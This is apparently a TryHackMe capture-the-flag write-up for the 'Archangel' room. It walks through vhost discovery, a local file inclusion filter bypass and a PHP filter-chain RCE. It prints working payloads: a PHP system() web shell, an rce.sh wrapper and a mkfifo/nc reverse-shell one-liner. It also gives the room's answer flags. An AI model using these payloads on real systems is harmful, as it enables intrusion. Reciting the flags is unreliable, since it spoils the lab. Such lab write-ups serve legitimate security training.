# 😇 Archangel

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/archangel)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com/room/archangel)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `10.48.129.113` |
| **OS** | Ubuntu (kernel 4.15.0-123-generic x86_64) |
| **Attack Surface** | HTTP vhost enumeration, LFI, PHP filter chain RCE |
| **Privesc** | www-data → archangel (out of scope) |

Archangel starts with a single open web port. An email address buried in the homepage source leaks a virtual hostname — `mafialive.thm` — which hosts a PHP page with a Local File Inclusion vulnerability gated behind a filter that blocks `../..` traversal and requires a specific path prefix. Reading the PHP source via `php://filter` reveals the filter logic, enabling a bypass. Log poisoning fails on the shared box due to accumulated broken PHP from other players, so RCE is achieved instead via a PHP filter chain using a `php://temp?<path>` trick to satisfy the `containsStr` check without corrupting the chain's empty-stream input.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sS -vv -p- -oA nmap/tcp_syn 10.48.129.113
sudo nmap -sU -vv --top-ports 200 -oA nmap/udp_top 10.48.129.113
```

```
22/tcp  open  SSH
80/tcp  open  HTTP — Apache/2.4.29 (Ubuntu)
68/udp  open|filtered  dhcpc  (noise — ignore)
```

### Directory Bruteforce — archangel

```bash
ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_archangel.json
```

```
/                → 200
/images/         → 301
/pages/          → 301  (static HTML templates only)
/flags/          → 301  (rickroll — dead end)
/layout/         → 301
/licence.txt     → 200
/server-status   → 403  (localhost-only)
```

### Vhost Discovery

Homepage source contained a contact email:

```bash
curl -s http://archangel/ | grep -i mail
# → support@mafialive.thm
```

```bash
echo "10.48.129.113 mafialive.thm" | sudo tee -a /etc/hosts
curl -s http://mafialive.thm/
# → <h1>UNDER DEVELOPMENT</h1>
# → thm{f0und_th3_r1ght_h0st_n4m3}
```

### Directory Bruteforce — mafialive.thm

```bash
ffuf -u http://mafialive.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_mafia.json
```

```
/robots.txt  → 200  (Disallow: /test.php)
/test.php    → 200  ← LFI endpoint
```

---

## 💀 Initial Access — LFI → PHP Filter Chain RCE

### LFI Discovery

`/test.php` exposed a `?view=` parameter with a button pre-linking to a local PHP file:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
→ "Control is an illusion"
```

### Reading the Filter Logic

Used `php://filter` to base64-encode and exfiltrate the `test.php` source without executing it:

```bash
curl -s "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
```

Source revealed the filter and **FLAG 2** in a comment:

```php
//FLAG: thm{explo1t1ng_lf1}

function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
```

**Filter rules:**
- Blocks: path containing `../..`
- Requires: path containing `/var/www/html/development_testing`

### LFI Path Traversal Bypass

The filter blocks `../..` as a substring but not `.././`. Chaining `.././` pairs satisfies both constraints:

```bash
# Reads /etc/passwd
curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
...
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

### Log Poisoning Attempt (failed)

```bash
# Poison User-Agent
curl -s -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
# Include access.log
curl -v "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=id"
```

Response: **HTTP 500** — log readable but accumulated broken PHP payloads from other players on the shared box caused a fatal error before execution reached our injection.

### PHP Filter Chain RCE

Used the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to generate `<?php system($_GET["cmd"]); ?>` from iconv encoding artifacts — no writable file required.

**The path check bypass trick:**

The generator outputs a chain ending in `resource=php://temp`. Replacing this with `resource=php://temp?/var/www/html/development_testing`:

- PHP ignores the `?...` query string on `php://` wrapper streams — the chain still gets its empty temp buffer as input
- `strpos()` in the filter sees `/var/www/html/development_testing` in the string → check passes

```bash
python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|' \
  > /tmp/chain.txt
```

Wrapper script for easy command execution:

```bash
#!/bin/bash
# rce.sh — usage: ./rce.sh "command"
CHAIN=$(python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|')
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$1")
curl -s "http://mafialive.thm/test.php?view=${ENCODED}&cmd=${CMD}" \
  | strings | sed 's/<[^>]*>//g' \
  | grep -v "^[[:space:]]*$" \
  | grep -v "INCLUDE\|Test Page\|button\|Here is\|DOCTYPE\|html\|head\|body\|title\|href"
```

```bash
./rce.sh id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

```bash
# Listener
nc -nlvp 4444 -s 192.168.240.231

# Trigger
./rce.sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.240.231 4444 >/tmp/f"
```

```
connect to [192.168.240.231] from (UNKNOWN) [10.48.129.113] 42158
www-data@ubuntu:/var/www/html/development_testing$
```

### User Flag

```bash
cat /home/archangel/user.txt
# thm{lf1_t0_rc3_1s_tr1cky}
```

---

## 🔁 Privilege Escalation

Not required for this engagement.

---

## 🗺️ Attack Chain

```
[archangel:80 — Apache/2.4.29]
    |
    | homepage source: support@mafialive.thm
    v
[mafialive.thm vhost]         → FLAG 1: thm{f0und_th3_r1ght_h0st_n4m3}
    |
    | robots.txt → /test.php
    v
[LFI — test.php?view=]
    |
    | php://filter base64 read → test.php source
    v
[Filter Logic Reversed]        → FLAG 2: thm{explo1t1ng_lf1}
    |  blocks: ../..
    |  requires: /var/www/html/development_testing
    |
    | log poisoning → HTTP 500 (broken PHP from other players)
    | PHP filter chain + php://temp?<path> bypass trick → RCE
    v
[www-data shell]
    |
    | /home/archangel/user.txt
    v
FLAG 3: thm{lf1_t0_rc3_1s_tr1cky}
```

---

## 📌 Key Takeaways

- An email address in a webpage's contact section can leak a virtual hostname — always grep page source for domain names, not just links
- `strpos()` blacklists based on substring matching are fragile: blocking `../..` while allowing `.././` is trivially bypassed
- `php://filter/convert.base64-encode` is a reliable way to exfiltrate PHP source without executing it — use it to understand filter logic before attempting bypasses
- Log poisoning on shared lab environments often fails due to other players' broken payloads; PHP filter chain RCE is a clean fallback that requires no writable file or injectable log
- The `php://temp?<arbitrary_string>` trick satisfies string-based path checks without altering filter chain behaviour — PHP ignores query strings on internal wrapper streams

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | [T1595.003](https://attack.mitre.org/techniques/T1595/003) |
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | TCP SYN + UDP port scan |
| `ffuf` | Directory and file bruteforce on both vhosts |
| `curl` | Manual LFI probing, source exfiltration, RCE delivery |
| `php_filter_chain_generator.py` | Generate PHP filter chain RCE payload |
| `rce.sh` | Custom wrapper — URL-encodes chain and delivers commands |
| `nc` | Reverse shell listener |

---

## 🚩 Flags

<details>
<summary><code>Flag 1 — vhost discovery</code></summary>

`thm{f0und_th3_r1ght_h0st_n4m3}`

</details>

<details>
<summary><code>Flag 2 — LFI source read</code></summary>

`thm{explo1t1ng_lf1}`

</details>

<details>
<summary><code>user.txt</code></summary>

`thm{lf1_t0_rc3_1s_tr1cky}`

</details>

---

> All activity documented here was conducted exclusively within TryHackMe's isolated lab environments. These writeups are intended for educational purposes and personal reference.
